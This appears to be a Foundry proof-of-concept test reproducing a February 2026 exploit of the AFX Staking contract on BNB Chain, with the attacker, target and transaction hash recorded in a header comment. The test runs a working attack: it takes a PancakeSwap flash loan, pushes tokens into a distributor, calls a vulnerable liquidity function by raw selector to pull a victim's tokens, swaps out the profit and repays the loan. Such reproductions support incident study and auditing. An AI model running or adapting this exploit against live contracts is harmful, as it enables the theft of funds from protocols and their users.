// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "src/shared/BaseTest.sol";
import "src/shared/interfaces.sol";

/*
@Protocol: AFX Staking
@Date: 2026-02-10
@Attacker: 0x236f08d8962e1F29700e3D91009bfa8D37D71e53
@Target: 0x129b803F5E8e36e2d6e705D84BBe7995b02FC0CB
@TxHash: 0x380cd298a607d4422edc640b7f5a907ec0792841ee5fc963d265b1189397c905
@ChainId: 56
@GasUsed: 1090943
*/

interface IPancakeRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);
    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);
    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);
    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);
    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);
    function getAmountsOut(
        uint256 amountIn,
        address[] calldata path
    ) external view returns (uint256[] memory amounts);
    function getAmountsIn(
        uint256 amountOut,
        address[] calldata path
    ) external view returns (uint256[] memory amounts);
}

interface IPancakeRouter02 is IPancakeRouter01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract AFX_StakingPoC is BaseTest {
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

    IERC20 AFX = IERC20(0xb6761B4D7b913EF048c92E3bb1305883422e819a);
    IERC20 AHT = IERC20(0xCD1eC887b081CfBA30C8003e8Ad1b67F92236C7B);
    IERC20 KING = IERC20(0xD06C2239D204e30Cb77A34eFb17037761D26E495);

    address vulnerableContract = 0x560d3973EE82a318d381c49fcbF3ce9d6CF1250B;
    address tokenDistributor = 0x671Ce4928E4Ddd6c299408038D7F4Cbb1944E227;
    address victim = 0x146933F2692F5fF3b62441AB3C2a65dDCAca753c;

    IPancakeRouter02 pancakeSwapRouter = IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IPancakePair afx_king_pair = IPancakePair(0x01B3beeea8D6892E4dd9f9cFE8045e49889Eb489);

    uint256 mockDeadLine = 1_770_723_563;

    function setUp() public {
        // vm.createSelectFork("bsc", 80_395_410);
        vm.createSelectFork("bsc", bytes32(0xcf7042f80816d9b33e55e02066f8ff532b80a36e1e6350bcca3c2be7c3eb1404));
        target = 0x129b803F5E8e36e2d6e705D84BBe7995b02FC0CB;
    }

    function testExploit() public balanceLog {
        // 1. FlashLoan
        uint256 afxBorrowAmount = 1_130_500 * 1e18;
        afx_king_pair.swap(afxBorrowAmount, 0, address(this), bytes("Lumos"));

        // 7. Swap AFX to BSC-USD
        address[] memory path = new address[](2);
        path[0] = address(AFX);
        path[1] = address(USDT);
        pancakeSwapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            AFX.balanceOf(address(this)), 0, path, address(this), mockDeadLine
        );

        // 8. Swap BSC-USD to BNB
        path[0] = address(USDT);
        path[1] = address(WBNB);
        pancakeSwapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            USDT.balanceOf(address(this)), 0, path, address(this), mockDeadLine
        );

        // 9. Unwrap WBNB
        WBNB.withdraw(WBNB.balanceOf(address(this)));
    }

    function pancakeCall(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes memory data
    ) external {
        USDT.approve(vulnerableContract, type(uint256).max);
        USDT.approve(address(pancakeSwapRouter), type(uint256).max);
        AFX.approve(address(pancakeSwapRouter), type(uint256).max);
        AHT.approve(address(pancakeSwapRouter), type(uint256).max);

        // 2. Transfer AFX to tokenDistributor -> addLiquidityUsdt
        uint256 victimBalance = AFX.balanceOf(victim);
        AFX.transfer(tokenDistributor, victimBalance - (10 * 1e18));

        // 3. Swap remain AFX to AHT
        address[] memory path = new address[](2);
        path[0] = address(AFX);
        path[1] = address(AHT);
        pancakeSwapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            AFX.balanceOf(address(this)), 0, path, address(this), mockDeadLine
        );

        // 4. call Vulnerable function
        // - bring AFX (from tokenDistributor)
        // - bring AHT (from victim)
        // - addLiquidity(AFX, AHT)
        _callAddLiquidityUsdt();

        // 5. Swap all AHT to AFX -> get profit
        path[0] = address(AHT);
        path[1] = address(AFX);
        pancakeSwapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            AHT.balanceOf(address(this)), 0, path, address(this), mockDeadLine
        );

        // 6. Repay with some fees
        uint256 afxBorrowAmount = amount0;
        uint256 afxRepayAmount = afxBorrowAmount + afxBorrowAmount * 25 / 9975 + 1;
        AFX.transfer(address(afx_king_pair), afxRepayAmount);
    }

    function _callAddLiquidityUsdt() internal {
        bytes4 selector = bytes4(0xb1a87f2c);
        uint256 amount = 100;
        vulnerableContract.call(abi.encodeWithSelector(selector, amount));
    }

    receive() external payable {}
}
